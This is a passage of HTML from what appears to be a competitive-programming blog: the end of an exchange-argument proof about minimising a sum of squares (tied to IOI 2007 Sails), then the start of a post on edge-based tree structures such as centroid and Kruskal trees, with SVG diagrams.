  <p>You’re given a number <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>. Pick <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> non-negative integers which sum to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> so that the sum of squares is minimised.</p>
</blockquote>

<p>The optimal solution here is the one which is lexicographically least when sorted in descending order.</p>

<p>Consider two sequences of numbers <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span>, where <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> is lexicographically less. Without loss of generality, assume both are sorted in decreasing order. Let <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A = G_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">B = S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, where <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> is the first difference. Since <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> is lexicographically less, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>&lt;</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A &lt; B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>. Since the totals must be the same, there must exist <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>&gt;</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">j &gt; i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> where <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msub><mi>G</mi><mi>j</mi></msub><mo>&gt;</mo><mi>D</mi><mo>=</mo><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">C = G_j &gt; D = S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>.</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>G</mi><mo>:</mo><mtext>&#x2005;&#x200a;</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>G</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>G</mi><mn>3</mn></msub><mo separator="true">,</mo><mo>&#x2026;</mo><mtext>&#xa0;</mtext><mi>A</mi><mo>&#x2026;</mo><mi>C</mi><mo>&#x2026;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>S</mi><mo>:</mo><mtext>&#x2005;&#x200a;</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><munder><munder><mrow><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><mtext>&#xa0;</mtext><msub><mi>S</mi><mn>2</mn></msub><mo separator="true">,</mo><mtext>&#xa0;</mtext><msub><mi>S</mi><mn>3</mn></msub><mo separator="true">,</mo><mo>&#x2026;</mo></mrow><mo stretchy="true">&#x23df;</mo></munder><mtext>same</mtext></munder><mtext>&#xa0;</mtext><mi>B</mi><mo>&#x2026;</mo><mi>D</mi><mo>&#x2026;</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
	G:\;&amp; G_1, G_2, G_3, \dots\ A\dots C \dots \\
	S:\;&amp; \underbrace{S_1,\ S_2,\ S_3, \dots}_\textrm{same}\ B \dots D \dots
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.9838320000000005em;vertical-align:-1.7419160000000002em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2419160000000002em;"><span style="top:-4.401916em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span><span style="top:-2.901916em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7419160000000002em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2419160000000002em;"><span style="top:-4.401916em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span></span></span><span style="top:-2.901916em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-1.656168em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord textrm mtight">same</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6833299999999999em;"><span class="svg-align" style="top:-2.15756em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width="400em" height="0.548em" viewBox="0 0 400000 548" preserveAspectRatio="xMinYMin slice"><path d="M0 6l6-6h17c12.688 0 19.313.3 20 1 4 4 7.313 8.3 10 13  35.313 51.3 80.813 93.8 136.5 127.5 55.688 33.7 117.188 55.8 184.5 66.5.688  0 2 .3 4 1 18.688 2.7 76 4.3 172 5h399450v120H429l-6-1c-124.688-8-235-61.7 -331-161C60.687 138.7 32.312 99.3 7 54L0 41V6z"></path></svg></span><span class="brace-center" style="height:0.548em;"><svg width="400em" height="0.548em" viewBox="0 0 400000 548" preserveAspectRatio="xMidYMin slice"><path d="M199572 214 c100.7 8.3 195.3 44 280 108 55.3 42 101.7 93 139 153l9 14c2.7-4 5.7-8.7 9-14  53.3-86.7 123.7-153 211-199 66.7-36 137.3-56.3 212-62h199568v120H200432c-178.3  11.7-311.7 78.3-403 201-6 8-9.7 12-11 12-.7.7-6.7 1-18 1s-17.3-.3-18-1c-1.3 0 -5-4-11-12-44.7-59.3-101.3-106.3-170-141s-145.3-54.3-229-60H0V214z"></path></svg></span><span class="brace-right" style="height:0.548em;"><svg width="400em" height="0.548em" viewBox="0 0 400000 548" preserveAspectRatio="xMaxYMin slice"><path d="M399994 0l6 6v35l-6 11c-56 104-135.3 181.3-238 232-57.3  28.7-117 45-179 50H-300V214h399897c43.3-7 81-15 113-26 100.7-33 179.7-91 237 -174 2.7-5 6-9 10-13 .7-1 7.3-1 20-1h17z"></path></svg></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8424400000000001em;"><span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.343832em;"><span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7419160000000002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p>Since <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>&#x2265;</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">A \ge C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2265;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>, we have <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>&gt;</mo><mi>A</mi><mo>&#x2265;</mo><mi>C</mi><mo>&gt;</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">B &gt; A \ge C &gt; D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2265;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> and so <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>&#x2212;</mo><mi>D</mi><mo>&gt;</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">B - D &gt; 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> since everything is an integer. As such, we can modify <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> through <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>&#x21a6;</mo><mi>B</mi><mo>&#x2212;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">B \mapsto B - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69433em;vertical-align:-0.011em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x21a6;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>&#x21a6;</mo><mi>D</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">D \mapsto D + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69433em;vertical-align:-0.011em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x21a6;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> to make it more efficient and closer to the greedy.</p>

<p>Thus, the lexicographically least solution is optimal.</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>This specific example is used to prove the solution for <a href="http://olympiads.win.tue.nl/ioi/ioi2007/contest/day1/sails.pdf">IOI 2007 Sails</a>. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/edge-trees">Edge-based tree data structures</a></h2>
  
    <div class="bounded"><blockquote>
  <p>This post has been rewritten in May 2020.</p>
</blockquote>

<p>A few days ago, I was thinking about the tree generated from recursively performing centroid decomposition as well as Cartesian trees, and noticed a surprising similarly. I continued exploring this idea, and rediscovered a data structure that provides new insight into graph problems based on the max/min edge weight along paths (widest path/bottleneck edge problems).</p>

<!--more-->

<h2 id="preface-existing-terminology"><a href="#preface-existing-terminology">Preface: Existing Terminology</a></h2>

<p>It turns out a portion of what I’ve discussed here already exists, and can be found by searching “Cartesian tree of edges” – <a href="https://erikdemaine.org/papers/Cartesian_ICALP2009/paper.pdf">this paper</a> for example.</p>

<p>However, my terminology I use in this post differs from what’s used in existing literature. In particular:</p>

<ul>
  <li>What I call a <em>Cartesian Tree of a Tree</em> is not described in literature</li>
  <li>What I call a <em>Kruskal Tree</em> is called a <em>Cartesian Tree of a Tree</em> in the above paper.</li>
</ul>

<p>I apologise for this confusion, but it’s somewhat unavoidable, as you’ll see later on.</p>

<h2 id="centroid-trees"><a href="#centroid-trees">Centroid Trees</a></h2>

<p>I’ll lay out the path to get to the Kruskal Tree. First, a few definitions, if you’re not familiar with them:</p>

<ul>
  <li>A <strong>centroid</strong> of a tree is a vertex that, when removed, leaves components which are at most half the size of the original tree.</li>
  <li>A <strong>centroid tree</strong> (also known as the <strong>centroid decomposition</strong> of a tree) is generated by extracting the centroid of a tree, then making the centroid decomposition of the remaining components its children.</li>
</ul>

<svg xmlns="http://www.w3.org/2000/svg" width="404pt" height="125pt" viewBox="0.00 0.00 404.00 125.00">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 121)">
    <title>%3</title>
    <g class="node">
      <title>d</title>
      <ellipse fill="none" stroke="black" cx="18" cy="-99" rx="18" ry="18" />
      <text text-anchor="middle" x="18" y="-95.3" font-family="Times,serif" font-size="14.00">d</text>
    </g>
    <g class="node">
      <title>b</title>
      <ellipse fill="none" stroke="black" cx="90" cy="-72" rx="18" ry="18" />
      <text text-anchor="middle" x="90" y="-68.3" font-family="Times,serif" font-size="14.00">b</text>
    </g>
    <g class="edge">
      <title>d--b</title>
      <path fill="none" stroke="black" d="M35.24,-92.74C46.54,-88.38 61.56,-82.58 72.85,-78.23" />
    </g>
    <g class="node">
      <title>e</title>
      <ellipse fill="none" stroke="black" cx="162" cy="-72" rx="18" ry="18" />
      <text text-anchor="middle" x="162" y="-68.3" font-family="Times,serif" font-size="14.00">e</text>
    </g>
    <g class="edge">
      <title>b--e</title>
      <path fill="none" stroke="black" d="M108.3,-72C119.15,-72 133.08,-72 143.9,-72" />
    </g>
    <g class="node">
      <title>c</title>
      <ellipse fill="none" stroke="black" cx="306" cy="-45" rx="18" ry="18" />
      <text text-anchor="middle" x="306" y="-41.3" font-family="Times,serif" font-size="14.00">c</text>
    </g>
    <g class="node">
      <title>f</title>
      <ellipse fill="none" stroke="black" cx="378" cy="-72" rx="18" ry="18" />
      <text text-anchor="middle" x="378" y="-68.3" font-family="Times,serif" font-size="14.00">f</text>
    </g>
    <g class="edge">
      <title>c--f</title>
      <path fill="none" stroke="black" d="M323.24,-51.26C334.54,-55.62 349.56,-61.42 360.85,-65.77" />
    </g>
    <g class="node">
      <title>h</title>
      <ellipse fill="none" stroke="black" cx="378" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="378" y="-14.3" font-family="Times,serif" font-size="14.00">h</text>
    </g>
    <g class="edge">
      <title>c--h</title>
      <path fill="none" stroke="black" d="M323.24,-38.74C334.54,-34.38 349.56,-28.58 360.85,-24.23" />
    </g>
    <g class="node">
      <title>g</title>
      <ellipse fill="none" stroke="black" cx="234" cy="-99" rx="18" ry="18" />
      <text text-anchor="middle" x="234" y="-95.3" font-family="Times,serif" font-size="14.00">g</text>
    </g>
    <g class="edge">
      <title>e--g</title>
      <path fill="none" stroke="black" d="M179.24,-78.26C190.54,-82.62 205.56,-88.42 216.85,-92.77" />
    </g>
    <g class="node">
      <title>a</title>
      <ellipse fill="none" stroke="black" cx="234" cy="-45" rx="18" ry="18" />
      <text text-anchor="middle" x="234" y="-41.3" font-family="Times,serif" font-size="14.00">a</text>
    </g>
    <g class="edge">
      <title>e--a</title>
      <path fill="none" stroke="black" d="M179.24,-65.74C190.54,-61.38 205.56,-55.58 216.85,-51.23" />
    </g>
    <g class="edge">
      <title>a--c</title>
      <path fill="none" stroke="black" d="M252.3,-45C263.15,-45 277.08,-45 287.9,-45" />
    </g>
    <g class="node">
      <title>i</title>
      <ellipse fill="none" stroke="black" cx="18" cy="-45" rx="18" ry="18" />
      <text text-anchor="middle" x="18" y="-41.3" font-family="Times,serif" font-size="14.00">i</text>
    </g>
    <g class="edge">
      <title>i--b</title>
      <path fill="none" stroke="black" d="M35.24,-51.26C46.54,-55.62 61.56,-61.42 72.85,-65.77" />
    </g>
  </g>
</svg>
<p><em>Figure 1: A random tree</em></p>

<svg xmlns="http://www.w3.org/2000/svg" width="260pt" height="188pt" viewBox="0.00 0.00 260.00 188.00">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 184)">
    <title>%3</title>
    <g class="node">
      <title>e</title>
